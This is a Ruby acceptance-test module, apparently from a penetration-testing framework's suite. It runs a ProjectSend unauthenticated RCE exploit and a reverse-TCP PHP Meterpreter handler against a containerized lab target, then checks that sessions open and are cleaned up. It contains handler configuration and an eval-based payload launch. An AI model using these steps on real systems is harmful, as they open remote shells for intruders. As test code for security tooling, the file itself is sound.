# frozen_string_literal: true

require_relative '../laravel/sessions'
require_relative '../projectsend_rce/acceptance'

# Stock CLI and genuine web sessions gate the unchanged default owner path.
module ProjectsendSessions
  include LaravelSessions
  include ProjectsendRceTarget

  def rc_save
    File.write(File.join(target_runtime.fetch('artifacts'), 'projectsend-sessions.json'), JSON.pretty_generate(@rc)) if @rc
  end

  def laravel_component
    'projectsend'
  end

  def laravel_owner
    ProjectsendTarget::OWNER
  end

  def session_control_name
    'ProjectsendSessionControl'
  end

  def session_families
    { 'staged' => [0, 'php/meterpreter/reverse_tcp', 'meterpreter'] }
  end

  def session_exec_argv(*command, detached: false)
    command[0] = 'php83' if command.first == 'php'
    target_runtime.fetch('compose') + ['exec', '-T'] + (detached ? ['-d'] : []) + ['--user', '1000', 'target', *command]
  end

  def rc_resource_roles
    %w[target database reporting_db]
  end

  def file(path)
    pr_native('proof', path)
  end

  def process_state
    output, = rc_command('process-state', 'target', 'php83', '/opt/module-target-projectsend-process.php', LaravelSessions::CALLBACK_PORT.to_s)
    state = JSON.parse(output)
    state.fetch('processes').reject! do |row|
      row.fetch('command') == session_health_command || row.values_at('uid', 'ppid', 'command') == ['0', 0, 'runc init']
    end
    state
  end

  def idle
    expect(rc_json('framework.sessions.keys')).to eq([])
    expect(rc_json('framework.jobs.keys')).to eq([])
    expect(session_rows).to all(include('closed_at' => be_a(String))) if @workspace
    state = process_state
    @rc[:states] << { phase: 'idle', state: state }
    rc_save
    expect(state.fetch('connections')).to eq([])
    worker = ->(row) { row.fetch('uid') == '1000' && row.fetch('command').include?('php-fpm: pool ') }
    parents = @baseline.fetch('processes').select { |row| row.fetch('command').include?('php-fpm: master process') }.map { |row| row.fetch('pid') }
    expect(parents.length).to eq(1)
    expect(state.fetch('processes').select(&worker)).to all(include('ppid' => parents.first))
    expect(state.fetch('processes').reject(&worker).map { |row| row.except('state') }).to eq(@baseline.fetch('processes').reject(&worker).map { |row| row.except('state') })
    true
  end

  def callback_control
    server = TCPServer.new('0.0.0.0', LaravelSessions::CALLBACK_PORT)
    token = 'projectsend-' + Rex::Text.rand_text_alphanumeric(24)
    task = Thread.new { Open3.capture3(*session_exec_argv('php83', '/opt/module-target-projectsend-callback.php', token, LaravelSessions::CALLBACK_PORT.to_s)) }
    task.report_on_exception = false
    raise Timeout::Error, 'No native PHP callback' unless IO.select([server], nil, nil, 8)

    peer = server.accept
    identity = JSON.parse(Timeout.timeout(5) { peer.gets })
    expect(identity).to include('token' => token, 'uid' => 1000)
    state = process_state
    expect(state.fetch('processes')).to include(include('pid' => identity.fetch('pid'), 'uid' => '1000'))
    expect(state.fetch('connections')).to include(include('state' => '01', 'uid' => 1000))
    @rc[:callback] = { identity: identity, observed: state }
    peer.puts('ACK:' + token)
    peer.close
    output, error, status = Timeout.timeout(15) { task.value }
    expect(status.success?).to be(true), error
    expect(JSON.parse(output)).to eq(identity)
    @listener_host = identity.fetch('host')
    settled
  ensure
    peer&.close unless peer&.closed?
    server&.close
    task&.join(15)
    rc_save
  end

  def pss_native(action, *arguments)
    argv = ['python3', '-B', 'test/module_targets/projectsend_sessions/session_native.py', action, *arguments]
    output, error, status = Open3.capture3(*argv)
    @rc[:native] << { action: action, argv: argv, exit: status.exitstatus, stdout: output, stderr: error }
    rc_save
    expect(status.success?).to be(true), error
    JSON.parse(output)
  end

  def pss_ready
    @rc[:readiness] = ps_native('before')
    expect(@rc.fetch(:readiness)).to include('passed' => true, 'module_invoked' => false)
    @rc[:mail_containment] = pr_native('contain-mail')
    @rc[:readiness]['baseline'] = @rc.fetch(:mail_containment).fetch('baseline')
    rc_resources('before')
    @rc[:observer] = rc_json("begin;load 'test/module_targets/projectsend_rce/observe.rb';ProjectsendRceObservation.install(framework,#{target_runtime.fetch('artifacts').inspect});end")
    @baseline = process_state
    expect(@baseline.fetch('connections')).to eq([])
    callback_control
    endpoint = target_endpoint('reporting_db')
    output = console_command("db_connect module_framework:module-target-framework-db-password@#{endpoint.fetch('host')}:#{endpoint.fetch('port')}/module_targets", timeout: 120)
    expect(output).not_to match(/\[-\]|Error|Exception/)
    @workspace = "projectsend_#{Process.pid}_0"
    expect(console_command('workspace -a ' + @workspace)).to include(@workspace)
    @ready = rc_json("begin;load 'test/module_targets/projectsend_sessions/session_control.rb';ProjectsendSessionControl.install(framework);end")
    @rc[:session_context] = { baseline: @baseline, listener_host: @listener_host, ready: @ready, workspace: @workspace }
    @rc[:before_owner] = pr_native('state')
    @rc[:prepared] = true
    rc_save
  end

  def pss_restore_context
    @baseline, @listener_host, @ready, @workspace = @rc.fetch(:session_context).values_at(:baseline, :listener_host, :ready, :workspace)
  end

  def use_session(family, attempt, owner)
    payload = session_families.fetch(family)[1]
    metadata = await_session(payload, owner)
    expect(metadata.fetch('type')).to eq('meterpreter')
    attempt[:metadata] = metadata
    identifier = metadata.fetch('id')
    path = "/tmp/module-target-projectsend-session-#{Process.pid}-#{identifier}"
    expect(file(path)).to eq('exists' => false)
    proof = rc_json("ProjectsendSessionControl.proof(framework,#{identifier},#{path.inspect},'projectsend-session',false)")
    attempt[:proof] = proof
    expect(file(path)).to eq('exists' => true, 'uid' => 1000, 'base64' => Base64.strict_encode64('projectsend-session'))
    state = process_state
    process = state.fetch('processes').find { |row| row.fetch('pid') == proof.fetch('pid') }
    expect(process).to include('uid' => '1000')
    sockets = state.fetch('connections')
    expect(sockets.length).to eq(1)
    expect(sockets.first).to include('state' => '01', 'uid' => 1000)
    attempt[:live_state] = state
    attempt[:process] = process
    attempt[:open_reports] = session_rows
    expect(attempt.fetch(:open_reports)).to include(include('id' => metadata.fetch('db_id'), 'via_exploit' => owner, 'via_payload' => 'payload/' + payload, 'closed_at' => nil))
    attempt[:shutdown] = rc_json("ProjectsendSessionControl.shutdown(framework,#{identifier})")
    rc_poll(15) { process_state.fetch('tcp').none? { |row| row.fetch('inode') == sockets.first.fetch('inode') } }
    if attempt.fetch(:transport, 'cli') == 'cli'
      rc_poll(15) { process_state.fetch('processes').none? { |row| row.values_at('pid', 'birth') == process.values_at('pid', 'birth') } }
    else
      expect(process.fetch('command')).to include('php-fpm: pool ')
      # FPM may reuse its worker after the PHP request ends. Socket closure,
      # closed reporting rows and normal worker ancestry are the invariants.
      attempt[:fpm_worker_may_persist] = true
    end
    rc_json("framework.sessions[#{identifier}]&.kill;true")
    console_command('jobs -K')
    settled
    attempt[:closed_reports] = session_rows
    expect(attempt.fetch(:closed_reports)).to include(include('id' => metadata.fetch('db_id'), 'closed_at' => be_a(String)))
    attempt[:closed_state] = process_state
    attempt[:used_and_closed] = true
  ensure
    pr_native('proof', path, 'remove') if path
    rc_save
  end

  def pss_stock_handler(attempt)
    payload = session_families.fetch('staged')[1]
    console_command('back')
    console_command('use exploit/multi/handler')
    options = { 'PAYLOAD' => payload, 'LHOST' => @listener_host, 'LPORT' => LaravelSessions::CALLBACK_PORT, 'ReverseListenerBindAddress' => '0.0.0.0', 'ExitOnSession' => false, 'SessionCommunicationTimeout' => 10, 'SessionExpirationTimeout' => 90 }
    options.each { |key, value| console_command("set #{key} #{value}") }
    attempt[:handler_output] = console_command('run -j -z')
    generated = rc_json("begin;job=framework.jobs.values.find{|entry|entry.ctx.first.fullname=='exploit/multi/handler'};raise 'No handler' unless job;handler,instance=job.ctx;{payload:instance.refname,encoded:Base64.strict_encode64(handler.payload.encoded)};end")
    expect(generated.fetch('payload')).to eq(payload)
    attempt[:generated] = generated
    generated
  end

  def pss_cli_control
    attempt = { family: 'staged', owner: 'exploit/multi/handler', transport: 'cli' }
    @rc[:attempts] << attempt
    generated = pss_stock_handler(attempt)
    source = "/tmp/module-target-projectsend-native-#{Process.pid}-staged"
    log = source + '-output'
    code = Base64.strict_decode64(generated.fetch('encoded'))
    argv = session_exec_argv('sh', '-c', 'cat > "$1"; chmod 600 "$1"; sha256sum "$1"', 'stock-source', source)
    output, error, status = Open3.capture3(*argv, stdin_data: code)
    expect(status.success?).to be(true), error
    expect(output.split.first).to eq(Digest::SHA256.hexdigest(code))
    argv = session_exec_argv('sh', '-c', 'exec php83 -r \'eval(file_get_contents($argv[1]));\' "$1" > "$2" 2>&1', 'stock-launch', source, log, detached: true)
    output, error, status = Open3.capture3(*argv)
    attempt[:launch] = { argv: argv, exit: status.exitstatus, stdout: output, stderr: error }
    expect(status.success?).to be(true), error
    use_session('staged', attempt, 'exploit/multi/handler')
    @rc[:calibrated] << 'staged'
  ensure
    attempt[:process_output] = file(log) if log
    rc_command('remove-stock-cli', 'target', 'rm', '-f', '--', source, log) if source
    cleanup_session
    rc_save
  end

  def pss_api_control
    attempt = { family: 'staged', owner: 'exploit/multi/handler', transport: 'api' }
    @rc[:attempts] << attempt
    generated = pss_stock_handler(attempt)
    program = File.join(target_runtime.fetch('artifacts'), 'projectsend-native-web-program.json')
    File.write(program, JSON.pretty_generate(generated))
    attempt[:preparation] = pss_native('prepare', program)
    argv = ['python3', '-B', 'test/module_targets/projectsend_sessions/session_native.py', 'trigger']
    input, output, error, waiter = Open3.popen3(*argv)
    input.close
    use_session('staged', attempt, 'exploit/multi/handler')
    expect(waiter.join(15)).not_to be_nil
    attempt[:trigger] = { argv: argv, exit: waiter.value.exitstatus, stdout: output.read, stderr: error.read }
    expect(attempt.fetch(:trigger).fetch(:exit)).to eq(0), attempt.fetch(:trigger)
    expect(JSON.parse(attempt.fetch(:trigger).fetch(:stdout))).to include('code' => 200)
    attempt[:recovery] = pss_native('cleanup')
    expect(attempt.fetch(:recovery).fetch('restored')).to eq(@rc.fetch(:before_owner))
    @rc[:api_calibrated] = true
  ensure
    if waiter&.alive?
      Process.kill('TERM', waiter.pid)
      waiter.join(5)
    end
    output&.close
    error&.close
    cleanup_session
    rc_save
  end

  def pss_owner
    2.times do |index|
      offset = rc_json('framework.instance_variable_get(:@projectsend_rce_events).length')
      options = { 'SSL' => false, 'LHOST' => @listener_host, 'LPORT' => LaravelSessions::CALLBACK_PORT, 'ReverseListenerBindAddress' => '0.0.0.0', 'AutoCheck' => index.zero?, 'WfsDelay' => 12, 'SessionCommunicationTimeout' => 10, 'SessionExpirationTimeout' => 90 }
      call = { label: 'default-staged-' + index.to_s, transport: 'owner', options: options }
      @rc[:calls] << call
      @rc[:attempts] << call
      run_target_module(OWNER, 'target', options, action: 'run -z', reuse_module: index.positive?, allow_errors: true, command_timeout: 75) do |output|
        call[:output] = output
        call[:selection] = rc_json('{object:active_module.object_id,target:active_module.datastore["TARGET"],target_name:active_module.target.name,payload:active_module.datastore["PAYLOAD"]}')
        call[:events] = rc_json("framework.instance_variable_get(:@projectsend_rce_events).drop(#{offset})")
        call[:actual_state] = pr_native('state')
        rc_save
      end
      expect(call.fetch(:output)).not_to include('Exploit failed', 'Exploit aborted')
      expect([0, '0']).to include(call.fetch(:selection).fetch('target'))
      expect(call.fetch(:selection).values_at('target_name', 'payload')).to eq(['PHP Command', 'php/meterpreter/reverse_tcp'])
      expect(call.fetch(:selection).fetch('object')).to eq(@rc.fetch(:calls).first.fetch(:selection).fetch('object'))
      original = call.fetch(:events).select { |row| row['event'] == 'call' && row['method'] == 'exploit' && File.realpath(row.fetch('source')) == File.realpath('modules/exploits/linux/http/projectsend_unauth_rce.rb') }
      expect(original.length).to eq(1)
      expect(call.fetch(:events).filter_map { |row| row['check'] }).to eq(index.zero? ? [{ 'code' => 'appears', 'reason' => 'The target appears to be vulnerable' }] : [])
      use_session('staged', call, OWNER)
      expect(pr_native('state')).to eq(call.fetch(:actual_state))
      expect(call.fetch(:actual_state).fetch('files')).to eq(@rc.fetch(:before_owner).fetch('files'))
      expect(call.fetch(:actual_state).fetch('physical_uploads')).to eq(@rc.fetch(:before_owner).fetch('physical_uploads'))
    ensure
      cleanup_session
      rc_save
    end
    @rc[:owner_attempted] = true
  end
end
